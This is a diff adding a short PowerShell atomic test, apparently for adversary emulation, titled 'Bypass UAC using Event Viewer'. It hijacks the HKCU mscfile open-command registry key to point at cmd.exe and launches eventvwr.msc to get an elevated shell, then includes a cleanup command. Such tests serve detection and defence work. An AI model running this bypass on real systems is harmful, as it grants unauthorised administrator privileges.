@@ -1,0 +1,13 @@
+#TechniqueName: Abuse Elevation Control Mechanism: Bypass User Access Control
+#AtomicTestName: Bypass UAC using Event Viewer (PowerShell)
+#Language: ps1
+
+#commands
+New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force
+Start-Process "C:\Windows\System32\eventvwr.msc"
+
+
+#cleanup_commands
+Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
+
